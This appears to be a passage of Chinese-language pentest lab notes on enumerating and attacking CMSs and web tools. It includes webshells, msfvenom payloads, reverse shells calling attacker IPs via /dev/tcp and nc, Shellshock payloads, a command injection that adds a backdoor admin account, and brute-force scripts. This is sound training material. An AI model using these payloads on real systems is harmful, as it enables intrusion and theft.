>[!NOTE]
>這章介紹CMS、網頁服務、常用工具的常見漏洞，很優
# WordPress - 列舉與攻擊手法
>[!WARNING]
>Wordpress有超過50,000個plugin跟4,100個分支版本，據統計有8%的wordpress資安事件是由於弱密碼，並且有60%是因為版本未更新
## WordPrss列舉手法
>[!NOTE]
>解釋手動列舉的手法，但是靠wpscan幾乎就可以用了
### Wordpress小知識
- 預設會有 `/robots.txt`
- plug-in主要放在`wp-content/plugins`裡面
- 登陸介面主要放在`wp-admin/wp-login.php`
- theme主要放在`wp-content/themes`
- WordPress的user身分主要有
	- Administrator
	- Editor : An editor can publish and manage posts, including the posts of other users.
	- Author : They can publish and manage their own posts.
	- Contributor : These users can write and manage their own posts but cannot publish them.
	- Subscriber : These are standard users who can browse posts and edit their profiles.
### Version 列舉
```shell-session
$ curl -s http://blog.inlanefreight.local | grep WordPress
```
- 輸出 : 可判斷版本為WordPress 5.8
```
<meta name="generator" content="WordPress 5.8" /
```
### Themes列舉
```shell-session
curl -s http://blog.inlanefreight.local/ | grep themes
```
- 輸出 : 可判段Theme是business-gravity
```
<link rel='stylesheet' id='bootstrap-css'  href='http://blog.inlanefreight.local/wp-content/themes/business-gravity/assets/vendors/bootstrap/css/bootstrap.min.css' type='text/css' media='all' />
```
### Plug-in列舉
- 列舉首頁使用的Plug-in
```shell-session
curl -s http://blog.inlanefreight.local/ | grep plugins
```
- 輸出 : 可判段Plug-in有contact-form-7、mail-masta
```shell-session
<link rel='stylesheet' id='contact-form-7-css'  href='http://blog.inlanefreight.local/wp-content/plugins/contact-form-7/includes/css/styles.css?ver=5.4.2' type='text/css' media='all' />
<script type='text/javascript' src='http://blog.inlanefreight.local/wp-content/plugins/mail-masta/lib/subscriber.js?ver=5.8' id='subscriber-js-js'></script>
<script type='text/javascript' src='http://blog.inlanefreight.local/wp-content/plugins/mail-masta/lib/jquery.validationEngine-en.js?ver=5.8' id='validation-engine-en-js'></script>
<script type='text/javascript' src='http://blog.inlanefreight.local/wp-content/plugins/mail-masta/lib/jquery.validationEngine.js?ver=5.8' id='validation-engine-js'></script>
		<link rel='stylesheet' id='mm_frontend-css'  href='http://blog.inlanefreight.local/wp-content/plugins/mail-masta/lib/css/mm_frontend.css?ver=5.8' type='text/css' media='all' />
<script type='text/javascript' src='http://blog.inlanefreight.local/wp-content/plugins/contact-form-7/includes/js/index.js?ver=5.4.2' id='contact-form-7-js'></script>
```
- 列舉 another page使用的Plug-in
```shell-session
curl -s http://blog.inlanefreight.local/?p=1 | grep plugins
```
- 輸出 : 可判段Plug-in有wpdiscuz、contact-form-7
```shell-session
<link rel='stylesheet' id='contact-form-7-css'  href='http://blog.inlanefreight.local/wp-content/plugins/contact-form-7/includes/css/styles.css?ver=5.4.2' type='text/css' media='all' />
<link rel='stylesheet' id='wpdiscuz-frontend-css-css'  href='http://blog.inlanefreight.local/wp-content/plugins/wpdiscuz/themes/default/style.css?ver=7.0.4' type='text/css' media='all' />
```
### User列舉
- 利用 `/wp-login.php`，會顯示使用者不存在、使用者密碼錯誤等資訊。
- 預設是`admin/admin`
- 可以利用Hydra、WPscan暴力破解
- 可以利用WPscan列舉user
### WPScan
- Plug-In 列舉
```
wpscan --url http://192.168.234.244 --enumerate p --plugins-detection aggressive -o websrv1/wpscan --api-token dEOFB<SNIP>
```
```
wpscan --update --url http://192.168.169.167/ --enumerate ap --plugins-detection aggressive
```
- User 列舉
```
wpscan –url http://example.com –enumerate u
```
- Theme 列舉
```
wpscan --url [http://www.anywordpressintalledsite.com/](http://www.anywordpressintalledsite.com/) --enumerate t
```
- 弱點Plug-In檢查
```
wpscan --url [http://www.anywordpressintalledsite.com/](http://www.anywordpressintalledsite.com/) --enumerate vp
```
##  WordPress攻擊手法
>[!NOTE]
>主要攻擊手法
>- 暴力破解
>- 弱點Plug-In 
>- 利用Theme、Plug-In取得RCE
### 暴力破解手法
>可以利用`wp-login`跟`xmlrpc`裡面的API做爆破，同時也可以用Hydra做爆破
```shell-session
sudo wpscan --password-attack xmlrpc -t 20 -U john -P /usr/share/wordlists/rockyou.txt --url http://blog.inlanefreight.local
```
```
sudo wpscan --url http://10.10.110.100:65000/wordpress -U james -P custom-wordlist.txt
```
### RCE(內建方法)
- 透過修改Theme
- 透過上傳Plug-In
- 透過Metasploit
```shell-session
msf6 > use exploit/unix/webapp/wp_admin_shell_upload 

[*] No payload configured, defaulting to php/meterpreter/reverse_tcp

msf6 exploit(unix/webapp/wp_admin_shell_upload) > set rhosts blog.inlanefreight.local
msf6 exploit(unix/webapp/wp_admin_shell_upload) > set username john
msf6 exploit(unix/webapp/wp_admin_shell_upload) > set password firebird1
msf6 exploit(unix/webapp/wp_admin_shell_upload) > set lhost 10.10.14.15 
msf6 exploit(unix/webapp/wp_admin_shell_upload) > set rhost 10.129.42.195  
msf6 exploit(unix/webapp/wp_admin_shell_upload) > set VHOST blog.inlanefreight.local
```
- Worldpress 4.9 之後不能修改themes，可以利用plugin-editor修改plugin
```
/wordpress/wp-content/plugins/akismet/class.akismet-cli.php
```
### 透過漏洞
>自己透過Google查詢
# Joomla - 列舉與攻擊手法
>[!WARNING]
>就是一個CMS系統
## Jommla列舉手法
>[!NOTE]
>解釋手動列舉的手法
### Jommla橫幅抓取
>同時可以關注robots.txt
```shell-session
curl -s http://dev.inlanefreight.local/ | grep Joomla
```
- 輸出
```shell-session
<meta name="generator" content="Joomla! - Open Source Content Management" />
```
### Joomla version
- 抓取README.txt
```shell-session
 curl -s http://dev.inlanefreight.local/README.txt | head -n 5
```
-  輸出
```shell-session
1- What is this?
	* This is a Joomla! installation/upgrade package to version 3.x
	* Joomla! Official site: https://www.joomla.org
	* Joomla! 3.9 version history - https://docs.joomla.org/Special:MyLanguage/Joomla_3.9_version_history
	* Detailed changes in the Changelog: https://github.com/joomla/joomla-cms/commits/staging
```
- 抓取joomla.xml
```shell-session
curl -s http://dev.inlanefreight.local/administrator/manifests/files/joomla.xml | xmllint --format -
```
- 輸出
```shell-session
<?xml version="1.0" encoding="UTF-8"?>
<extension version="3.6" type="file" method="upgrade">
  <name>files_joomla</name>
  <author>Joomla! Project</author>
  <authorEmail>admin@joomla.org</authorEmail>
  <authorUrl>www.joomla.org</authorUrl>
  <copyright>(C) 2005 - 2019 Open Source Matters. All rights reserved</copyright>
  <license>GNU General Public License version 2 or later; see LICENSE.txt</license>
  <version>3.9.4</version>
  <creationDate>March 2019</creationDate>
```
- 抓取cache.xml
```shell-session
curl -s http://dev.inlanefreight.local/plugins/system/cache/cache.xml | xmllint --format -
```
### 自動化列舉-droopescam
- 安裝
```shell-session
sudo pip3 install droopescan
```
- 使用指令
```shell-session
droopescan scan joomla --url http://dev.inlanefreight.local/
```
###  自動化列舉-joomscan
- 安裝
```
git clone https://github.com/rezasp/joomscan.git
cd joomscan
perl joomscan.pl
```
- 使用指令
```
perl joomscan.pl --url www.example.com
```
## Jommla攻擊手法
>[!NOTE]
>與WordPress類似，都是利用修改Theme的方式跟CVE的方式拿取RCE。
### 暴力破解手法
-  [joomla-bruteforce](https://github.com/ajnik/joomla-bruteforce)
```shell-session
sudo python3 joomla-brute.py -u http://dev.inlanefreight.local -w /usr/share/metasploit-framework/data/wordlists/http_default_pass.txt -usr admin
```
### RCE(內建方法)
`Templates` -> `protostar`(依照狀況而定) -> `Templates: Customise` page -> `error.php`
```shell-session
http://dev.inlanefreight.local/templates/protostar/error.php
```
# Drupal - 列舉與攻擊手法
>[!WARNING]
>又是一個CMS系統
## Drupal列舉手法
>[!NOTE]
>解釋手動列舉的手法
### Drupal橫幅抓取 
```shell-session
curl -s http://drupal.inlanefreight.local | grep Drupal
```
- 輸出
```shell-session
<meta name="Generator" content="Drupal 8 (https://www.drupal.org)" />
      <span>Powered by <a href="https://www.drupal.org">Drupal</a></span>
```
### Drupal版本列舉
>[!NOTE]
>分成新版本跟舊辦本
- 新版本可以利用README.txt跟CHANGELOG.txt來判斷
```shell-session
 curl -s http://drupal-acc.inlanefreight.local/CHANGELOG.txt | grep -m2 ""
```
- 利用`Droopescan`
```shell-session
droopescan scan drupal -u http://drupal.inlanefreight.local
```
## Drupal攻擊手法
>[!WARNING]
>Drupal攻擊手法比較多元，這章介紹比較經典的打法
### 透過修改php內容
>[!NOTE]
>- Drupal 7之前: 要先打開`PHP filter`，才可以開啟PHP修改的功能
>- Drupal 8: `PHP filter`沒有被預設打開，所以需要自行安裝
- 下載Drupal 8的 PHP filter
```shell-session
wget https://ftp.drupal.org/files/projects/php-8.x-1.1.tar.gz
```
- 其餘過程跟其他CMS沒啥差別，就是加入可以RCE的PHP
### 上傳後門程式
>[!WARNING]
>Drupal可以讓使用者上傳Plug-In，所以可以透過修改Plug-In的方式拿RCE。
- 以CAPTCHA這個Plug-In為範例，下載後再解壓縮。
```shell-session
wget --no-check-certificate  https://ftp.drupal.org/files/projects/captcha-8.x-1.2.tar.gz
```
```shell-session
tar xvf captcha-8.x-1.2.tar.gz
```
- 製作php一句話木馬，`shell.php`
```php
<?php
system($_GET[fe8edbabc5c5c9b7b764504cd22b17af]);
?>
```
- 製作 .htaccess讓我們自己可以進去目錄
```html
<IfModule mod_rewrite.c>
RewriteEngine On
RewriteBase /
</IfModule>
```
- 把上述資料都打包到CAPTCHA資料夾裡面
```shell-session
mv shell.php .htaccess captcha
```
```shell-session
tar cvf captcha.tar.gz captcha/
```
- 把資料在 `http://drupal.inlanefreight.local/admin/modules/install`上傳之後，就可以拿到RCE
```shell-session
curl -s drupal.inlanefreight.local/modules/captcha/shell.php?fe8edbabc5c5c9b7b764504cd22b17af=id
```
### 透過已知漏洞
- Drupalgeddon
	- affects versions 7.0 up to 7.31
	- [CVE-2014-3704](https://www.exploit-db.com/exploits/34992) 
	- `python2.7 drupalgeddon.py -t http://drupal-qa.inlanefreight.local -u hacker -p pwnd`
	- Metasploit-framework(exploit/multi/http/drupal_drupageddon)
- Drupalgeddon2
	- affects versions 7.58 and 8.5.1
	- [CVE-2018-7600](https://www.exploit-db.com/exploits/44448)
- Drupalgeddon3
	- affects multiple versions of Drupal 7.x and 8.x
	- [CVE-2018-7602]
	- Metasploit-framework(multi/http/drupal_drupageddon3)
# Tomcat - 列舉與攻擊手法 
>[!NOTE]
>[Apache Tomcat](https://tomcat.apache.org/) is an open-source web server that hosts applications written in Java. Tomcat was initially designed to run Java Servlets and Java Server Pages (JSP) scripts. However, its popularity increased in Java-based frameworks and is now widely used by frameworks such as Spring and tools such as Gradle.
## Tomcat列舉手法
### Tomcat版本列舉
- 透過不存在的目錄
http://app-dev.inlanefreight.local:8080/invalid
- 透過/docs 
```shell-session
 curl -s http://app-dev.inlanefreight.local:8080/docs/ | grep Tomcat 
```
- 輸出
```shell-session
<html lang="en"><head><META http-equiv="Content-Type" content="text/html; charset=UTF-8"><link href="./images/docs-stylesheet.css" rel="stylesheet" type="text/css"><title>Apache Tomcat 9 (9.0.30) - Documentation Index</title><meta name="author" 

<SNIP>
```
### Tomcat架構圖
```shell-session
├── bin
├── conf
│   ├── catalina.policy
│   ├── catalina.properties
│   ├── context.xml
│   ├── tomcat-users.xml
│   ├── tomcat-users.xsd
│   └── web.xml
├── lib
├── logs
├── temp
├── webapps
│   ├── manager
│   │   ├── images
│   │   ├── META-INF
│   │   └── WEB-INF
|   |       └── web.xml
│   └── ROOT
│       └── WEB-INF
└── work
    └── Catalina
        └── localhost
```
- `bin` : scripts and binaries needed to start and run a Tomcat server 
- `conf` : stores various configuration files used by Tomcat 
- `tomcat-users.xml` :  stores user credentials and their assigned roles
- `lib` :  holds the various JAR files needed for the correct functioning of Tomcat
- `logs`、`temp` :  store temporary log files
- `webapps` :  default webroot of Tomcat and hosts all the applications
- `work` :  acts as a cache and is used to store data during runtime
#### tomcat-users.xml
```xml
<?xml version="1.0" encoding="UTF-8"?>

<SNIP>
  
<tomcat-users xmlns="http://tomcat.apache.org/xml"
              xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
              xsi:schemaLocation="http://tomcat.apache.org/xml tomcat-users.xsd"
              version="1.0">
<!--
  By default, no user is included in the "manager-gui" role required
  to operate the "/manager/html" web application.  If you wish to use this app,
  you must define such a user - the username and password are arbitrary.

  Built-in Tomcat manager roles:
    - manager-gui    - allows access to the HTML GUI and the status pages
    - manager-script - allows access to the HTTP API and the status pages
    - manager-jmx    - allows access to the JMX proxy and the status pages
    - manager-status - allows access to the status pages only

  The users below are wrapped in a comment and are therefore ignored. If you
  wish to configure one or more of these users for use with the manager web
  application, do not forget to remove the <!.. ..> that surrounds them. You
  will also need to set the passwords to something appropriate.
-->

   
 <SNIP>
  
!-- user manager can access only manager section -->
<role rolename="manager-gui" />
<user username="tomcat" password="tomcat" roles="manager-gui" />

<!-- user admin can access manager and admin section both -->
<role rolename="admin-gui" />
<user username="admin" password="admin" roles="manager-gui,admin-gui" />


</tomcat-users>
```

### Tomcat裡面的Project的架構圖
>[!NOTE]
>一般是在webapps裡面
```shell-session
webapps/customapp
├── images
├── index.jsp
├── META-INF
│   └── context.xml
├── status.xsd
└── WEB-INF
    ├── jsp
    |   └── admin.jsp
    └── web.xml
    └── lib
    |    └── jdbc_drivers.jar
    └── classes
        └── AdminServlet.class   
```
-  `WEB-INF/web.xml` : This file stores information about the routes used by the application and the classes handling these routes.
- `WEB-INF/classes` : These classes might contain important business logic as well as sensitive information.
- `lib` :  stores the libraries needed by that particular application
- `jsp` : JavaServer Pages
####  web.xml
```xml
<?xml version="1.0" encoding="ISO-8859-1"?>

<!DOCTYPE web-app PUBLIC "-//Sun Microsystems, Inc.//DTD Web Application 2.3//EN" "http://java.sun.com/dtd/web-app_2_3.dtd">

<web-app>
  <servlet>
    <servlet-name>AdminServlet</servlet-name>
    <servlet-class>com.inlanefreight.api.AdminServlet</servlet-class>
  </servlet>

  <servlet-mapping>
    <servlet-name>AdminServlet</servlet-name>
    <url-pattern>/admin</url-pattern>
  </servlet-mapping>
</web-app>   
```
### 目錄爆破
```shell-session
gobuster dir -u http://web01.inlanefreight.local:8180/ -w /usr/share/dirbuster/wordlists/directory-list-2.3-small.txt
```
## Tomcat攻擊手法
>[!WARNING]
>- 暴力破解 
>- 上傳 WAR File Upload
>- CVE-2020-1938
### 暴力破解
Apache Tomcat的管理解面可以可以利用暴力破解進入，可以利用msfconsole裡面的工具爆破，或是利用python script爆破。
- msfconsole
```
auxiliary/scanner/http/tomcat_mgr_login/
```
```shell-session
msf6 auxiliary(scanner/http/tomcat_mgr_login) > set VHOST web01.inlanefreight.local
msf6 auxiliary(scanner/http/tomcat_mgr_login) > set RPORT 8180
msf6 auxiliary(scanner/http/tomcat_mgr_login) > set stop_on_success true
msf6 auxiliary(scanner/http/tomcat_mgr_login) > set rhosts 10.129.201.58
```
```shell-session
/usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_userpass.txt
```
```shell-session
/usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_users.txt 
```
- python script : [連結](https://github.com/b33lz3bub-1/Tomcat-Manager-Bruteforce)
```
python mgr_brute.py -u users.txt -p pass.txt -U http://10.10.10.194:8080/ -P host-manager/ 
```
```python
#!/usr/bin/python

import requests
from termcolor import cprint
import argparse

parser = argparse.ArgumentParser(description = "Tomcat manager or host-manager credential bruteforcing")

parser.add_argument("-U", "--url", type = str, required = True, help = "URL to tomcat page")
parser.add_argument("-P", "--path", type = str, required = True, help = "manager or host-manager URI")
parser.add_argument("-u", "--usernames", type = str, required = True, help = "Users File")
parser.add_argument("-p", "--passwords", type = str, required = True, help = "Passwords Files")

args = parser.parse_args()

url = args.url
uri = args.path
users_file = args.usernames
passwords_file = args.passwords

new_url = url + uri
f_users = open(users_file, "rb")
f_pass = open(passwords_file, "rb")
usernames = [x.strip() for x in f_users]
passwords = [x.strip() for x in f_pass]

cprint("\n[+] Atacking.....", "red", attrs = ['bold'])

for u in usernames:
    for p in passwords:
        r = requests.get(new_url,auth = (u, p))

        if r.status_code == 200:
            cprint("\n[+] Success!!", "green", attrs = ['bold'])
            cprint("[+] Username : {}\n[+] Password : {}".format(u,p), "green", attrs = ['bold'])
            break
    if r.status_code == 200:
        break

if r.status_code != 200:
    cprint("\n[+] Failed!!", "red", attrs = ['bold'])
    cprint("[+] Could not Find the creds :( ", "red", attrs = ['bold'])
#print r.status_code
```

### WAR File Upload
/manager/html裡面可以上傳東西，在那邊上傳惡意的shell
- 利用msfvenom製作JSP War Reverse Shell
```
msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.0.123 LPORT=3155 -f war > shell.war
```
- 利用msfvenom製作JSP War Bind Shell
```
msfvenom -p java/jsp_shell_bind_tcp RHOST=0.0.0.0 LPORT=3155 -f war > bind.war
```
- 利用腳本製作webshell : [連結](https://raw.githubusercontent.com/tennc/webshell/master/fuzzdb-webshell/jsp/cmd.jsp)
```java
<%@ page import="java.util.*,java.io.*"%>
<%
//
// JSP_KIT
//
// cmd.jsp = Command Execution (unix)
//
// by: Unknown
// modified: 27/06/2003
//
%>
<HTML><BODY>
<FORM METHOD="GET" NAME="myform" ACTION="">
<INPUT TYPE="text" NAME="cmd">
<INPUT TYPE="submit" VALUE="Send">
</FORM>
<pre>
<%
if (request.getParameter("cmd") != null) {
        out.println("Command: " + request.getParameter("cmd") + "<BR>");
        Process p = Runtime.getRuntime().exec(request.getParameter("cmd"));
        OutputStream os = p.getOutputStream();
        InputStream in = p.getInputStream();
        DataInputStream dis = new DataInputStream(in);
        String disr = dis.readLine();
        while ( disr != null ) {
                out.println(disr); 
                disr = dis.readLine(); 
                }
        }
%>
</pre>
</BODY></HTML>
```
```shell-session
zip -r backup.war cmd.jsp 
```
- 使用msfconsole
```
multi/http/tomcat_mgr_upload
```
### CVE-2020-1938 : Ghostcat
>All Tomcat versions before 9.0.31, 8.5.51, and 7.0.100 were found vulnerable
- POC : [連結](https://github.com/YDHCUI/CNVD-2020-10487-Tomcat-Ajp-lfi)
```shell-session
python2.7 tomcat-ajp.lfi.py app-dev.inlanefreight.local -p 8009 -f WEB-INF/web.xml 
```
### Apache Tomcat RCE
>[!WARNING]
>该漏洞是由于Tomcat CGI将命令行参数传递给Windows程序的方式存在错误，使得CGIServlet被命令注入影响。
该漏洞只影响Windows平台，需要启用了CGIServlet和enableCmdLineArguments参数。但是CGIServlet和enableCmdLineArguments参数默认情况下都不启用。

>[!WARNING]
>簡單來說就是Tomcat有一個鬼功能就是利用各種語言的腳本控制系統指令，但是對於系統指令的參數沒控制好， 所以可以丟奇怪的東西到系統執行。
>CVE-2019-0232影響的範圍是`9.0.0.M1` to `9.0.17`, `8.5.0` to `8.5.39`, and `7.0.0` to `7.0.93`
- 需要Tomcat的設定中enableCmdLineArguments要設定為true
```xml
<servlet>
    <servlet-name>cgi</servlet-name>
    <servlet-class>org.apache.catalina.servlets.CGIServlet</servlet-class>
    <init-param>
      <param-name>cgiPathPrefix</param-name>
      <param-value>WEB-INF/cgi-bin</param-value>
    </init-param>
    <init-param>
      <param-name>enableCmdLineArguments</param-name>
      <param-value>true</param-value>
    </init-param>
    <init-param>
      <param-name>executable</param-name>
      <param-value></param-value>
    </init-param>
    <load-on-startup>5</load-on-startup>
</servlet>
```
- 腳本列舉
```shell-session
ffuf -w /usr/share/dirb/wordlists/common.txt -u http://10.129.204.227:8080/cgi/FUZZ.cmd
```
```shell-session
ffuf -w /usr/share/dirb/wordlists/common.txt -u http://10.129.204.227:8080/cgi/FUZZ.bat
```
- 參數列舉 : 手動慢慢猜
```http
http://10.129.204.227:8080/cgi/welcome.bat?&set
```
- 漏洞利用
```http
http://10.129.204.227:8080/cgi/welcome.bat?&c%3A%5Cwindows%5Csystem32%5Cwhoami.exe
```
# Jenkins - 列舉與攻擊手法 
>[!NOTE]
>Jenkins是一款由Java編寫的開源的持續整合工具
## Jenkins列舉手法 
>[!WARNING]
>沒啥列舉手法，基本上就是用眼睛看。
- Jenkins預設是8080 port，並且利用5000 port與ˋ slave servers 聯繫。
- 時常利用最高權限安裝。
- 預設密碼admin/admin
##  Jenkins攻擊手法
>[!WARNING]
>Jenkins內建有一個Script Console，可以執行Apache Groovy，我們可以透過Script Console拿到shell。
### Linux Shell
- Webshell
```groovy
def cmd = 'id'
def sout = new StringBuffer(), serr = new StringBuffer()
def proc = cmd.execute()
proc.consumeProcessOutput(sout, serr)
proc.waitForOrKill(1000)
println sout
```
- Linux Reverse Shell
```groovy
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.10.14.15/8443;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()
```
### Windows Shell
- Windows Webshell
```groovy
def cmd = "cmd.exe /c dir".execute();
println("${cmd.text}");
```
- Windows Reverse Shell
```groovy
String host="localhost";
int port=8044;
String cmd="cmd.exe";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```
# Splunk - 列舉與攻擊手法 
>[!NOTE]
>Splunk is a log analytics tool used to gather, analyze and visualize data. Though not originally intended to be a SIEM tool, Splunk is often used for security monitoring and business analytics.
## Splunk列舉手法
- 預設8000 port 
- 預設帳密 admin:changeme
- Splunk management port : 8089
## Splunk攻擊手法
>[!WARNING]
>Install app from file可以上傳檔案，可以透過這個方法拿到reverse shell
- 上傳點 : `/en-US/manager/search/apps/local`
### Payload使用
- payload : [連結](https://github.com/0xjpuff/reverse_shell_splunk/tree/master)
```
reverse_shell_splunk
├── bin
│   ├── rev.py
│   ├── run.bat
│   └── run.ps1
└── default
    └── inputs.conf
```
>需要修改run.ps1或是rev.py
# PRTG Network Monitor - 列舉與攻擊手法 
>[!NOTE]
>PRTG Network Monitor is agentless network monitor software. It can be used to monitor bandwidth usage, uptime and collect statistics from various hosts, including routers, switches, servers, and more
## PRTG Network Monitor 列舉手法
- 可以修改port位，時常會安裝在80、443、8080。
- Nmap掃描結果會出現 `Indy httpd 17.3.33.2830`
### PRTG Network Monitor本版列舉
```shell-session
curl -s http://10.129.201.50:8080/index.htm -A "Mozilla/5.0 (compatible;  MSIE 7.01; Windows NT 5.0)" | grep version
```
- 輸出
```shell-session
  <link rel="stylesheet" type="text/css" href="/css/prtgmini.css?prtgversion=17.3.33.2830__" media="print,screen,projection" />
<div><h3><a target="_blank" href="https://blog.paessler.com/new-prtg-release-21.3.70-with-new-azure-hpe-and-redfish-sensors">New PRTG release 21.3.70 with new Azure, HPE, and Redfish sensors</a></h3><p>Just a short while ago, I introduced you to PRTG Release 21.3.69, with a load of new sensors, and now the next version is ready for installation. And this version also comes with brand new stuff!</p></div>
    <span class="prtgversion">&nbsp;PRTG Network Monitor 17.3.33.2830 </span>
```
## PRTG Network Monitor攻擊手法
>[!WARNING]
>這邊是用CVE-2018-9276，command injection作為範例

>[!NOTE]
>PRTG < 18.2.39 : 這邊是用CVE-2018-9276 Command Injectiion
### CVE-2018-9276
在PRTG Network Monitor裡面的`Add new notification`點選`EXECUTE PROGRAM`，可以在`parameter`裡面做到Command Injection。
```
test.txt;net user prtgadm1 Pwn3d_by_PRTG! /add;net localgroup administrators prtgadm1 /add
```
這樣就會把後門帳號加入系統，接下來就可以利用帳號密碼登入系統。
```shell-session
sudo crackmapexec smb 10.129.201.50 -u prtgadm1 -p Pwn3d_by_PRTG! 
```
# osTicket - 列舉與攻擊手法
>[!NOTE]
>osTicket is an open-source support ticketing system. It can be compared to systems such as Jira, OTRS, Request Tracker, and Spiceworks. osTicket can integrate user inquiries from email, phone, and web-based forms into a web interface.
## osTicket 列舉手法
>[!WARNING]
>很少CVE可以利用的拉
- 利用EyeWitness可以發現有`OSTSESSID`這個cookie在，代表系統是osTicket
# Gitlab - 列舉與攻擊手法
>[!NOTE]
>Gitlab是跟Github差不多的系統，都是可以用來做版本控制。
## Gitlab 列舉手法
- 版本列舉只有在登入後，進入`/help`頁面才有版本號碼可以看。
- 沒啥手法，頂多看看 `/explore`裡面的project。
## Gitlab 攻擊手法
>[!WARNING]
>預設有錯誤上鎖制度，所以沒啥暴力破解方法，只能想辦法取得帳號然後打POC
### Username Enumeration
- [連結](https://github.com/dpgg101/GitLabUserEnum)
``` shell
python gitlab_userenum.py --url http://gitlab.inlanefreight.local:8081/ --userlist users.txt
```
- python script
``` python
#!/usr/bin/env python3

import requests
import argparse

def main():
    parser = argparse.ArgumentParser(description='GitLab User Enumeration')
    parser.add_argument('--url', '-u', type=str, required=True, help='The URL of the GitLab\'s instance')
    parser.add_argument('--wordlist', '-w', type=str, required=True, help='Path to the username wordlist')
    args = parser.parse_args()

    print('GitLab User Enumeration in python')

    with open(args.wordlist, 'r') as f:
        for line in f:
            username = line.strip()
            http_code = requests.head(f'{args.url}/{username}').status_code
            if http_code == 200:
                print(f'[+] The username {username} exists!')
            elif http_code == 0:
                print('[!] The target is unreachable.')
                break

if __name__ == '__main__':
    main()
```
### Authenticated Remote Code Execution
- [POC](https://www.exploit-db.com/exploits/49951)
``` shell
python 49951.py -t http://gitlab.inlanefreight.local:8081 -u test -p test -c 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.10.15.80 4444 >/tmp/f '
```
#  Common Gateway Interface (CGI) - 列舉與攻擊手法 
>[!NOTE]
>CGI是在古老的網頁系統尚未有javascript的時代，前端要有動態的顯示必須靠後端的CGI scripts對前端做render，而CGI scripts就放在`/CGI-bin`裡面，CGI scripts可以用C, C++, Java, PERL,等不同語言撰寫。
>CVE-2014-6271(shellshock)是本章節要討論的東西
## shellshock漏洞成因
因為CGI scripts可以讓使用者把一個function定義進變數裡面，比如說:
```bash
$ env y='() { :;}; echo vulnerable-shellshock' bash -c "echo not vulnerable"
```
當CGI scripts執行到`$ env y='() { :;};`就會return 0，但是還是會繼續執行後面的程式，造成類似command injection的效果。
## cgi檔案列舉
```shell-session
gobuster dir -u http://10.129.204.231/cgi-bin/ -w /usr/share/wordlists/dirb/small.txt -x cgi
```
## shellshock漏洞利用
- 漏洞利用
```shell-session
curl -H 'User-Agent: () { :; }; echo ; echo ; /bin/cat /etc/passwd' bash -s :'' http://10.129.204.231/cgi-bin/access.cgi
```
- Reverse Shell
```shell-session
curl -H 'User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/10.10.14.38/7777 0>&1' http://10.129.204.231/cgi-bin/access.cgi
```
# Thick Client Applications
>**富客戶端平台**，即**Rich Client Platform（RCP）**，指的是一種C/S（Client/Server）應用軟體的公用基礎結構實現，其Rich概念是相對於B/S（Browser/Server）應用軟體的（Thin Client）瀏覽器而言的，有時也稱之為胖客戶端（Fat Client）或者傳統客戶端（Traditional Client），它通常包含以下組件：

- 一個微核生命周期管理容器
- 一個模塊或插件框架
- 一個輕便的控制項工具包（包括按鈕（Button），表單元素（Form Element），樹（Tree），表格（Table/Grid），菜單（Menu），工具條（ToolBar）等）
- 一個文件緩存，文本處理，文本編輯器（用於IDE項目）
- 一個工作檯（包括入口（Portal），頁面（Page），視圖（View），透視圖（Perspective），嚮導（Wizard），窗口（Frame）等）
- 一個數據綁定機制
- 一個軟體更新管理裝置

>開發人員可以基於已存在的平台構建一個應用，以替代原有的從零開始寫起的複雜應用，這得益於平台的供應商已經對平台做了大量檢驗和測試，基於平台的應用可以方便快速的開發和集成，並且跨系統的工作也統一由平台做了，已經有一些平台供應商聲稱基於他們的RCP平台構建的客戶端可以在多種作業系統上運行。

>[!NOTE]
>有點看不懂這是三小
# ColdFusion - 列舉與攻擊手法 
>[!NOTE]
>Adobe ColdFusion（直譯：冷聚變），是一個商用的快速應用程式開發平台，在1995年由JJ Allaire開創。ColdFusion最初是為了建立能與資料庫連接的網站而開發的。2.0版本（1996年推出）以後，它成為了一個全面的開發平台,包括一個整合式開發環境以及功能全面的手稿語言。

>[!NOTE]
>ColdFusion Markup Language (`CFML`) is the proprietary programming language used in ColdFusion to develop dynamic web applications. It has a syntax similar to HTML, making it easy to learn for web developers.
## CVE列表
-  CVE-2021-21087: Arbitrary disallow of uploading JSP source code
-  CVE-2020-24453: Active Directory integration misconfiguration
-  CVE-2020-24450: Command injection vulnerability
-  CVE-2020-24449: Arbitrary file reading vulnerability
-  CVE-2019-15909: Cross-Site Scripting (XSS) Vulnerability
## ColdFusion列舉手法
- `/CFIDE/administrator` 是登入點
### 常見port位 
|Port Number|Protocol|Description|
|---|---|---|
|80|HTTP|Used for non-secure HTTP communication between the web server and web browser.|
|443|HTTPS|Used for secure HTTP communication between the web server and web browser. Encrypts the communication between the web server and web browser.|
|1935|RPC|Used for client-server communication. Remote Procedure Call (RPC) protocol allows a program to request information from another program on a different network device.|
|25|SMTP|Simple Mail Transfer Protocol (SMTP) is used for sending email messages.|
|8500|SSL|Used for server communication via Secure Socket Layer (SSL).|
|5500|Server Monitor|Used for remote administration of the ColdFusion server.|
## ColdFusion攻擊手法
>[!WARNING]
>主要用POC來打
###  ColdFusion < 9.0.1 的 Directory Traversal
```shell-session
python2 14641.py 10.129.204.230 8500 "../../../../../../../../ColdFusion8/lib/password.properties"
```
### ColdFusion 8 的 RCE
>CVE-2009-2265，POC 50057需要修改exploit內部的rhost、lhost等資訊。
```shell-session
python3 50057.py 
```
# IIS Tilde Enumeration
>[!NOTE]
>這是用於列舉IIS某些版本的檔案時可以利用的技巧。

假如今天有一個檔案叫做apple.asp，有IIS Tilde弱點就會這樣
```
http://target/~a 200 OK
http://target/~b 404 Not Found
```
## 手動列舉手法
